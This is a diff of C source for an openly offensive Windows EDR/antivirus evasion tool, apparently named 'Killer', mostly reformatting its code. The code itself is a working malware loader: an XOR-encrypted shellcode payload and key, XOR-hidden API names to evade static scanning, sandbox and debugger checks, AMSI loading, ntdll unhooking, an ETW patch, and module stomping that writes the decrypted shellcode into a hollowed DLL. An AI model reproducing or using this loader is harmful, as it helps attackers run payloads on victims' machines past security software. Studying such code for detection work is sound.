@@ -2,7 +2,6 @@
 	Author: Hossam Ehab - facebook.com/0xHossam
 	Title : Killer tool for EDR/AV Evasion --> IAT Obfuscation - Module stomping - DLL Unhooking & ETW Patching - Run payload without create a new thread
 	Date  : 8/3/2023
-
 */
 
 #include <Windows.h>
@@ -32,82 +31,82 @@
 #define BR(fmt, ...) printf("\t" RED " [-] Author => Hossam Ehab / An EDR (End Point Detection & Response) Evasion Tool " NC BOLD fmt NL NC, __VA_ARGS__)
 
 int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
-  _wcslwr_s(substr, MAX_PATH);
-  _wcslwr_s(mystr, MAX_PATH);
+	_wcslwr_s(substr, MAX_PATH);
+	_wcslwr_s(mystr, MAX_PATH);
 
-  int result = 0;
-  if (StrStrW(mystr, substr) != NULL) {
-    result = 1;
-  }
+	int result = 0;
+	if (StrStrW(mystr, substr) != NULL) {
+		result = 1;
+	}
 
-  return result;
+	return result;
 }
 
 // https://cocomelonc.github.io/malware/2023/04/16/malware-av-evasion-16.html
 FARPROC myGetProcAddr(HMODULE hModule, LPCSTR lpProcName) {
-  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
-  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
-  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
-  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
+	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
-  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
-  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
-  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
+	DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
+	WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
+	DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
 
-  for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
-    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
-      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
-    }
-  }
+	for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
+		if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
+			return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
+		}
+	}
 
-  return NULL;
+	return NULL;
 }
 
 // https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html
 // custom implementation
 HMODULE myGetModuleHandle(LPCWSTR lModuleName) {
 
-  // obtaining the offset of PPEB from the beginning of TEB
-//   PEB* pPeb = (PEB*)__readgsqword(0x60);
+	// obtaining the offset of PPEB from the beginning of TEB
+	// PEB* pPeb = (PEB*)__readgsqword(0x60);
 #ifdef _M_IX86 
-  PEB * pPeb = (PEB *) __readfsdword(0x30);
+	PEB * pPeb = (PEB *) __readfsdword(0x30);
 #else
-  PEB * pPeb = (PEB *)__readgsqword(0x60);
+	PEB * pPeb = (PEB *)__readgsqword(0x60);
 #endif
 
-  // for x86
-  // PEB* pPeb = (PEB*)__readgsqword(0x30);
+	// for x86
+	// PEB* pPeb = (PEB*)__readgsqword(0x30);
 
-  // obtaining the address of the head node in a linked list 
-  // which represents all the models that are loaded into the process.
-  PEB_LDR_DATA* Ldr = pPeb->Ldr;
-  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 
+	// obtaining the address of the head node in a linked list 
+	// which represents all the models that are loaded into the process.
+	PEB_LDR_DATA* Ldr = pPeb->Ldr;
+	LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 
 
-  // iterating to the next node. this will be our starting point.
-  LIST_ENTRY* pStartListEntry = ModuleList->Flink;
+	// iterating to the next node. this will be our starting point.
+	LIST_ENTRY* pStartListEntry = ModuleList->Flink;
 
-  // iterating through the linked list.
-  WCHAR mystr[MAX_PATH] = { 0 };
-  WCHAR substr[MAX_PATH] = { 0 };
-  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
+	// iterating through the linked list.
+	WCHAR mystr[MAX_PATH] = { 0 };
+	WCHAR substr[MAX_PATH] = { 0 };
+	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
 
-    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
-    LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
+		// getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
+		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
 
-    // checking if this is the DLL we are looking for
-    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
-    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
-    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
-    wcscpy_s(substr, MAX_PATH, lModuleName);
-    if (cmpUnicodeStr(substr, mystr)) {
-      // returning the DLL base address.
-      return (HMODULE)pEntry->DllBase;
-    }
-  }
+		// checking if this is the DLL we are looking for
+		memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
+		memset(substr, 0, MAX_PATH * sizeof(WCHAR));
+		wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
+		wcscpy_s(substr, MAX_PATH, lModuleName);
+		if (cmpUnicodeStr(substr, mystr)) {
+			// returning the DLL base address.
+			return (HMODULE)pEntry->DllBase;
+		}
+	}
 
-  // the needed DLL wasn't found
-  PRINT_ERROR("failed to get a handle to %s\n", lModuleName);
-  return NULL;
+	// the needed DLL wasn't found
+	PRINT_ERROR("failed to get a handle to %ls\n", lModuleName);
+	return NULL;
 }
 
 VOID EnableConsoleColors()
@@ -122,23 +121,23 @@ VOID EnableConsoleColors()
 #define SIZEOF(x) sizeof(x) - 1
 #define KEY 0xb6
 
-char decKey[] = { 0xfe, 0xd9, 0x81, 0xc5, 0xf7, 0xfb, 0x85, 0xf3, 0xde, 0x86, 0xf4, 0xf7, 0x83, 0xda, 0xe6, 0xe7, 0xc1, 0x84, 0xcc, 0xee, 0xc1, 0x85, 0xf8, 0x0 }; //Ho7sAM3Eh0BA5lPQw2zXw3N
-int keysize = SIZEOF(decKey);
+char decKey[] = "\xfe\xd9\x81\xc5\xf7\xfb\x85\xf3\xde\x86\xf4\xf7\x83\xda\xe6\xe7\xc1\x84\xcc\xee\xc1\x85\xf8"; // Ho7sAM3Eh0BA5lPQw2zXw3N
+unsigned int keysize = SIZEOF(decKey);
 
 unsigned char shellcode[] = { 0x4e, 0x56, 0x0f, 0x3d, 0x54, 0x51, 0x1b, 0x30, 0x33, 0xb9, 0xca, 0x9b, 0xcb, 0x71, 0x31, 0x45, 0x59, 0x22, 0x33, 0x60, 0x70, 0xd4, 0x4d, 0x3b, 0xd3, 0x8c, 0xd8, 0x70, 0x4e, 0x71, 0x6d, 0x78, 0xa8, 0xb6, 0x09, 0x97, 0xcf, 0xf5, 0xf8, 0xa6, 0xeb, 0xfb, 0x32, 0x61, 0xcd, 0xfd, 0xbe, 0x88, 0xa2, 0xa7, 0xfd, 0x5d, 0xfc, 0x60, 0xea, 0x2d, 0x35, 0x41, 0x43, 0x31, 0xe5, 0xc8, 0x7b, 0x4d, 0x41, 0x73, 0x37, 0x6f, 0x48, 0x4e, 0x32, 0xcd, 0x10, 0x27, 0xcd, 0x88, 0xae, 0x07, 0x85, 0x27, 0xca, 0x0a, 0x6a, 0x31, 0x04, 0x6b, 0xad, 0xbe, 0x21, 0x76, 0x4f, 0xa4, 0xcd, 0x7b, 0x2d, 0x19, 0x23, 0x73, 0x2f, 0x10, 0x0a, 0x35, 0x6b, 0x19, 0x03, 0x68, 0x29, 0x95, 0x32, 0x05, 0xc9, 0x77, 0xbc, 0x2e, 0x98, 0x4f, 0x7a, 0x6b, 0x18, 0xf1, 0x76, 0x3f, 0x5d, 0xdb, 0x2d, 0x53, 0x91, 0x43, 0x79, 0x4c, 0x05, 0xb8, 0x09, 0x19, 0xab, 0x42, 0xbe, 0x71, 0x0b, 0x3b, 0x53, 0x14, 0x79, 0x7e, 0x86, 0x24, 0xb0, 0x54, 0xf4, 0x40, 0x03, 0x3d, 0xa1, 0x84, 0x72, 0xe1, 0x81, 0x42, 0x7f, 0xa6, 0x79, 0x03, 0xe5, 0x76, 0x10, 0xf2, 0x06, 0xfc, 0x10, 0x99, 0x93, 0x7d, 0x17, 0xa1, 0xe0, 0x69, 0x0c, 0x13, 0x0d, 0xca, 0x37, 0x2f, 0x27, 0xc3, 0x1e, 0xe3, 0x76, 0x10, 0x1d, 0x46, 0xb7, 0xd4, 0x18, 0x6c, 0x35, 0x41, 0xca, 0xb0, 0xe3, 0x95, 0x32, 0x05, 0x7d, 0x31, 0xbc, 0x4f, 0x1a, 0xc5, 0x7b, 0x26, 0x19, 0x28, 0xdf, 0x95, 0x90, 0x51, 0x2d, 0x38, 0x88, 0x83, 0x71, 0x48, 0x69, 0x31, 0x31, 0x20, 0x4f, 0x9b, 0xaf, 0x79, 0x06, 0xfa, 0x46, 0x15, 0x30, 0x78, 0xc0, 0x5e, 0x18, 0x3c, 0x47, 0xca, 0x0a, 0x10, 0x3a, 0xce, 0x7b, 0x55, 0x13, 0xf8, 0x7f, 0x0f, 0x1a, 0xc5, 0x7b, 0x12, 0x8a, 0x4b, 0x7a, 0x21, 0x00, 0x02, 0x3c, 0x74, 0x10, 0x03, 0x30, 0x68, 0x45, 0xf3, 0xa5, 0xb1, 0x97, 0xb4, 0x27, 0xb4 };
 unsigned int shellcode_len = sizeof(shellcode);
 
-void decShell(unsigned char* pEnctyptedShell)
+void decShell(unsigned char* pEncryptedShell)
 {
-	for (int idx = 0, ctr = 0; idx < shellcode_len; idx++)
+	for (unsigned int idx = 0, ctr = 0; idx < shellcode_len; idx++)
 	{
 		ctr = (ctr == keysize) ? 0 : ctr;
-		pEnctyptedShell[idx] = pEnctyptedShell[idx] ^ decKey[ctr++];
+		pEncryptedShell[idx] = pEncryptedShell[idx] ^ decKey[ctr++];
 	}
 
 }
 
-void deObfuscate(char* cApi, int nSize)
+void deObfuscate(LPSTR cApi, int nSize)
 {
 	for (int i = 0; i < nSize; i++)
 	{
@@ -226,28 +225,28 @@ BOOL checkResources() {
 	// check RAM
 	ms.dwLength = sizeof(ms);
 	pGlobalMemoryStatusExFunc(&ms);
-	ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
+	ram = (DWORD)(ms.ullTotalPhys / 1024 / 1024 / 1024);
 	if (ram < 2) return false;
 	return true;
 }
 
-/* Encrypted strings by xor to evade static stuff : */
-char cNtAllocateVirtualMemory[] = { 0xf8, 0xc2, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xd7, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
-char cNtWriteVirtualMemory[] = { 0xf8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
-char cNtCreateThreadEx[] = { 0xf8, 0xc2, 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0xf3, 0xce, 0x0 };
-char cNtProtectVirtualMemory[] = { 0xf8, 0xc2, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
-char cNtQueryInformationThread[] = { 0xf8, 0xc2, 0xe7, 0xc3, 0xd3, 0xc4, 0xcf, 0xff, 0xd8, 0xd0, 0xd9, 0xc4, 0xdb, 0xd7, 0xc2, 0xdf, 0xd9, 0xd8, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0x0 };
-char cCreateFileA[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xf7, 0x0 };
-char cGetCurrentProcess[] = { 0xf1, 0xd3, 0xc2, 0xf5, 0xc3, 0xc4, 0xc4, 0xd3, 0xd8, 0xc2, 0xe6, 0xc4, 0xd9, 0xd5, 0xd3, 0xc5, 0xc5, 0x0 };
-char cNtdll[] = { 0xd8, 0xc2, 0xd2, 0xda, 0xda, 0x98, 0xd2, 0xda, 0xda, 0x0 };
-char cAmsi[] = { 0xd7, 0xdb, 0xc5, 0xdf, 0x98, 0xd2, 0xda, 0xda, 0x0 };
-char cEtwEventWrite[] = { 0xf3, 0xc2, 0xc1, 0xf3, 0xc0, 0xd3, 0xd8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0x0 };
-char cMapViewOfFile[] = { 0xfb, 0xd7, 0xc6, 0xe0, 0xdf, 0xd3, 0xc1, 0xf9, 0xd0, 0xf0, 0xdf, 0xda, 0xd3, 0x0 };
-char cCheckRemote[] = { 0xf5, 0xde, 0xd3, 0xd5, 0xdd, 0xe4, 0xd3, 0xdb, 0xd9, 0xc2, 0xd3, 0xf2, 0xd3, 0xd4, 0xc3, 0xd1, 0xd1, 0xd3, 0xc4, 0xe6, 0xc4, 0xd3, 0xc5, 0xd3, 0xd8, 0xc2, 0x0 };
-char cCheckGlobalMemory[] = { 0xf1, 0xda, 0xd9, 0xd4, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0xe5, 0xc2, 0xd7, 0xc2, 0xc3, 0xc5, 0xf3, 0xce, 0x0 };
-char cLib2Name[] = { 0xdd, 0xd3, 0xc4, 0xd8, 0xd3, 0xda, 0x85, 0x84, 0x98, 0xd2, 0xda, 0xda, 0x0 };
-char b[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0x0 };
-char cCreateFileMapping[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xfb, 0xd7, 0xc6, 0xc6, 0xdf, 0xd8, 0xd1, 0xf7, 0x0 };
+/* Encrypted strings by xor to evade static stuff: */
+char cNtAllocateVirtualMemory[] = "\xf8\xc2\xf7\xda\xda\xd9\xd5\xd7\xc2\xd3\xe0\xdf\xc4\xc2\xc3\xd7\xda\xfb\xd3\xdb\xd9\xc4\xcf"; // NtAllocateVirtualMemory
+char cNtWriteVirtualMemory[] = "\xf8\xc2\xe1\xc4\xdf\xc2\xd3\xe0\xdf\xc4\xc2\xc3\xd7\xda\xfb\xd3\xdb\xd9\xc4\xcf"; // NtWriteVirtualMemory
+char cNtCreateThreadEx[] = "\xf8\xc2\xf5\xc4\xd3\xd7\xc2\xd3\xe2\xde\xc4\xd3\xd7\xd2\xf3\xce"; // NtCreateThreadEx
+char cNtProtectVirtualMemory[] = "\xf8\xc2\xe6\xc4\xd9\xc2\xd3\xd5\xc2\xe0\xdf\xc4\xc2\xc3\xd7\xda\xfb\xd3\xdb\xd9\xc4\xcf"; // NtProtectVirtualMemory
+char cNtQueryInformationThread[] = "\xf8\xc2\xe7\xc3\xd3\xc4\xcf\xff\xd8\xd0\xd9\xc4\xdb\xd7\xc2\xdf\xd9\xd8\xe2\xde\xc4\xd3\xd7\xd2"; // NtQueryInformationThread
+char cCreateFileA[] = "\xf5\xc4\xd3\xd7\xc2\xd3\xf0\xdf\xda\xd3\xf7"; // CreateFileA
+char cGetCurrentProcess[] = "\xf1\xd3\xc2\xf5\xc3\xc4\xc4\xd3\xd8\xc2\xe6\xc4\xd9\xd5\xd3\xc5\xc5"; // GetCurrentProcess
+char cNtdll[] = "\xd8\xc2\xd2\xda\xda\x98\xd2\xda\xda"; // ntdll.dll
+char cAmsi[] = "\xd7\xdb\xc5\xdf\x98\xd2\xda\xda"; // amsi.dll
+char cEtwEventWrite[] = "\xf3\xc2\xc1\xf3\xc0\xd3\xd8\xc2\xe1\xc4\xdf\xc2\xd3"; // EtwEventWrite
+char cMapViewOfFile[] = "\xfb\xd7\xc6\xe0\xdf\xd3\xc1\xf9\xd0\xf0\xdf\xda\xd3"; // MapViewOfFile
+char cCheckRemote[] = "\xf5\xde\xd3\xd5\xdd\xe4\xd3\xdb\xd9\xc2\xd3\xf2\xd3\xd4\xc3\xd1\xd1\xd3\xc4\xe6\xc4\xd3\xc5\xd3\xd8\xc2"; // CheckRemoteDebuggerPresent
+char cCheckGlobalMemory[] = "\xf1\xda\xd9\xd4\xd7\xda\xfb\xd3\xdb\xd9\xc4\xcf\xe5\xc2\xd7\xc2\xc3\xc5\xf3\xce"; // GlobalMemoryStatusEx
+char cLib2Name[] = "\xdd\xd3\xc4\xd8\xd3\xda\x85\x84\x98\xd2\xda\xda"; // kernel32.dll
+char b[] = "\xe0\xdf\xc4\xc2\xc3\xd7\xda\xe6\xc4\xd9\xc2\xd3\xd5\xc2"; // VirtualProtect
+char cCreateFileMapping[] = "\xf5\xc4\xd3\xd7\xc2\xd3\xf0\xdf\xda\xd3\xfb\xd7\xc6\xc6\xdf\xd8\xd1\xf7"; // CreateFileMappingA
 
 void deObfuscateNT() {
 	deObfuscate(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory));
@@ -259,7 +258,7 @@ void deObfuscateNT() {
 
 BOOL checkNUMA() {
 	LPVOID mem = NULL;
-	char cVirtualAllocExNuma[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xf3, 0xce, 0xf8, 0xc3, 0xdb, 0xd7, 0x0 };
+	char cVirtualAllocExNuma[] = "\xe0\xdf\xc4\xc2\xc3\xd7\xda\xf7\xda\xda\xd9\xd5\xf3\xce\xf8\xc3\xdb\xd7"; // VirtualAllocExNuma
 	deObfuscate(cVirtualAllocExNuma, SIZEOF(cVirtualAllocExNuma));
 	pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)myGetProcAddr(GetModuleHandle("kernel32.dll"), cVirtualAllocExNuma);
 	mem = myVirtualAllocExNuma(pGetCurrentProcessFunc(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
@@ -281,33 +280,32 @@ void deObfuscateFunc() {
 	deObfuscate(cCreateFileMapping, SIZEOF(cCreateFileMapping));
 }
 
-/* Function to reverse a shellcode array in 0x format */
-void reverseShellcode(unsigned char *shellcode, int size) {
+/* Function to reverse a shellcode array */
+void reverseShellcode(unsigned char* shellcode_param, int size) {
     int i;
     unsigned char temp;
     for (i = 0; i < size/2; i++) {
-        temp = shellcode[size-i-1];
-        shellcode[size-i-1] = shellcode[i];
-        shellcode[i] = temp;
-    } if (size % 2 != 0) { shellcode[size/2] = shellcode[size/2]; }
+        temp = shellcode_param[size-i-1];
+        shellcode_param[size-i-1] = shellcode_param[i];
+        shellcode_param[i] = temp;
+    } if (size % 2 != 0) { shellcode_param[size/2] = shellcode_param[size/2]; }
 }
 
-
-
 int main(int argc, char** argv) {
-
+	UNREFERENCED_PARAMETER(argc);
 /* 
 	If you want to run the malware in the background use this main function and put a comment in the int main... :
 	int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { 
 */
 
-	EnableConsoleColors(); // دي عشان اول البانر ملكش دعوة بيها ^_^
+	EnableConsoleColors();
 	banner();
 
 	unsigned char* pHollowedDLL;
-	HMODULE hAMSI, hModule;
+	HMODULE hAMSI;
+	//HMODULE hModule;
 	DWORD dwOldProtection = 0;
-	DWORD dwOldProtect = 0;
+	//DWORD dwOldProtect = 0;
 	BOOL bTrap = FALSE;
 	char* pMem;
 	int nMemAlloc, nCtr = 0;
@@ -324,15 +322,16 @@ int main(int argc, char** argv) {
 
 	Stolen from :  https://github.com/abdallah-elsharif/hellMaker/blob/main/samples/calc64.c#L610 Really nice tool ^_^
 */
-	nMemAlloc = KEY << 20; // will be 1048576
-	if (!(pMem = (char*)malloc(nMemAlloc))) { return EXIT_FAILURE; }
+	nMemAlloc = KEY << 20; // will be KEY*1048576
+	pMem = (char*)malloc(nMemAlloc);
+	if (!pMem) { return EXIT_FAILURE; }
 	for (int idx = 0; idx < nMemAlloc; idx++) { pMem[nCtr++] = 0x00; }
 	if (nMemAlloc != nCtr) { return EXIT_FAILURE; }
 
 	deObfuscate(cLib2Name, SIZEOF(cLib2Name)); // decrypt "kernel32.dll"
 	deObfuscate(cAmsi, SIZEOF(cAmsi)); // decrypt "amsi.dll"
 
-	hAMSI = LoadLibraryA(cAmsi);
+	hAMSI = LoadLibraryA((LPSTR)cAmsi);
 
 	wchar_t wtk[20];
   	mbstowcs(wtk, cLib2Name, strlen(cLib2Name)+1); //plus null
@@ -373,10 +372,14 @@ int main(int argc, char** argv) {
   	mbstowcs(wtext, cNtdll, strlen(cNtdll)+1); //plus null
   	LPWSTR wNtdll = wtext;
 
-	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory is Hooked\n"); nbHooks++; } else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked"); }
-	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) {  PRINT_ERROR(" NtProtectVirtualMemory is Hooked\n");  nbHooks++; } else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked"); }
-	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) {PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++;                } else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked"); }
-	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) {PRINT_ERROR(" NtQueryInformationThread Hooked\n"); nbHooks++;   } else { PRINT_SUCCESS(" NtQueryInformationThread Not Hooked\n"); }
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory is Hooked\n"); nbHooks++; }
+	else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked"); }
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) { PRINT_ERROR(" NtProtectVirtualMemory is Hooked\n");  nbHooks++; }
+	else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked"); }
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) { PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++; }
+	else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked"); }
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) { PRINT_ERROR(" NtQueryInformationThread Hooked\n"); nbHooks++; }
+	else { PRINT_SUCCESS(" NtQueryInformationThread Not Hooked\n"); }
 
 	deObfuscateFunc();
 
@@ -414,7 +417,8 @@ int main(int argc, char** argv) {
 	if (checkResources() == false) {  PRINT_ERROR("I got you sandbox, it's can't be run here :(\n"); return -2; }
 	PRINT_SUCCESST("Sandbox rounds finished no sandbox detected ;)");
 
-	if (!pCheckRemoteDebuggerPresentFunc(pGetCurrentProcessFunc(), &bTrap) || bTrap) { return EXIT_FAILURE; } else { PRINT_SUCCESST("Debugger is not attach"); }
+	if (!pCheckRemoteDebuggerPresentFunc(pGetCurrentProcessFunc(), &bTrap) || bTrap) { return EXIT_FAILURE; }
+	else { PRINT_SUCCESST("Debugger is not attach"); }
 
 	if (nbHooks > 0) {
 		char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
@@ -442,18 +446,23 @@ int main(int argc, char** argv) {
 
 		printf("\n[+] Detecting hooks in new ntdll module\n");
 
-		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory Hooked\n"); }   else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked\n"); }
-		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) { PRINT_ERROR(" NtProtectVirtualMemory Hooked\n");}      else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked\n"); }
-		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) { PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++; }   else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked\n"); }
-		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) { PRINT_ERROR(" NtQueryInformationThread Hooked\n"); } else {	PRINT_SUCCESS("NtQueryInformationThread Not Hooked\n"); }
-	} else { PRINT_STATUS("No hooked modules to unhook it!"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory Hooked\n"); }
+		else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked\n"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) { PRINT_ERROR(" NtProtectVirtualMemory Hooked\n"); }
+		else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked\n"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) { PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++; }
+		else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked\n"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) { PRINT_ERROR(" NtQueryInformationThread Hooked\n"); }
+		else { PRINT_SUCCESS("NtQueryInformationThread Not Hooked\n"); }
+	}
+	else { PRINT_STATUS("No hooked modules to unhook it!"); }
 
 	HINSTANCE hNtdll = myGetModuleHandle(wNtdll);
-	uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)myGetProcAddr(hNtdll, cNtAllocateVirtualMemory);
+	//uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)myGetProcAddr(hNtdll, cNtAllocateVirtualMemory);
 	uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)myGetProcAddr(hNtdll, cNtWriteVirtualMemory);
 	uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)myGetProcAddr(hNtdll, cNtProtectVirtualMemory);
-	uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)myGetProcAddr(hNtdll, cNtCreateThreadEx);
-	uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)myGetProcAddr(hNtdll, cNtQueryInformationThread);
+	//uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)myGetProcAddr(hNtdll, cNtCreateThreadEx);
+	//uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)myGetProcAddr(hNtdll, cNtQueryInformationThread);
 
 	/* 
 		PATCH ETW : is technique used for bypassing some security controls, If you want to read about it see this from ired.team :
@@ -464,7 +473,7 @@ int main(int argc, char** argv) {
 	deObfuscate(cEtwEventWrite, SIZEOF(cEtwEventWrite));
 
 	void* etwAddr = myGetProcAddr(myGetModuleHandle(wNtdll), cEtwEventWrite);
-	char etwPatch[] = { 0xC3 };
+	char etwPatch[] = { static_cast<char>(0xC3) };
 	DWORD lpflOldProtect = 0;
 	unsigned __int64 memPage = 0x1000;
 	void* etwAddr_bk = etwAddr;
@@ -487,7 +496,7 @@ int main(int argc, char** argv) {
 		RtlMoveMemory(pHollowedDLL, shellcode, sizeof(shellcode)); 
 	*/
 
-	PRINT_SUCCESST("moving the payload to the hollowed memory without using an APIs");
+	PRINT_SUCCESST("moving the payload to the hollowed memory without using any APIs");
 
 	for (int i = 0; i < sizeof(shellcode); i++) {
 		pHollowedDLL[i] = shellcode[i];
@@ -499,10 +508,10 @@ int main(int argc, char** argv) {
 	*/
 
 	deObfuscate(decKey, SIZEOF(decKey));
-    reverseShellcode(pHollowedDLL, sizeof(shellcode));	
+	reverseShellcode(pHollowedDLL, sizeof(shellcode));	
 	decShell(pHollowedDLL);
 
